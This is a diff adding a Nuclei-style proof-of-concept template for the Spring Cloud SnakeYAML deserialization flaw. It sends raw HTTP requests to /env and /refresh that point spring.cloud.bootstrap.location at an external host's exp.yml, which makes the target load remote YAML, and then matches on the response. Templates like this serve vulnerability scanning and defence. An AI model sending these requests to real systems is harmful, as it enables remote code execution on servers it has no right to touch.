@@ -1,0 +1,46 @@
+id: poc-yaml-spring-cloud-snakeyaml-rce
+info:
+  name: poc-yaml-spring-cloud-snakeyaml-rce
+  author: apple
+  severity: critical
+  description: spring cloud在低版本下的 SnakeYAML 依赖组件存在反序列漏洞
+  reference:
+    - https://blog.csdn.net/qq_50854662/article/details/131408664
+    - https://github.com/passer-W/snakeyaml-memshell
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /env HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 NetType/WIFI MicroMessenger/6.8.0(0x16080000) MacWechat/3.8.2(0x13080213) XWEB/30808 Flue
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        Connection: close
+        Content-Length: 66
+
+        spring.cloud.bootstrap.location=http://{{interactsh-url}}/exp.yml
+      - |-
+        POST /refresh HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        DNT: 1
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - spring.cloud.bootstrap.location
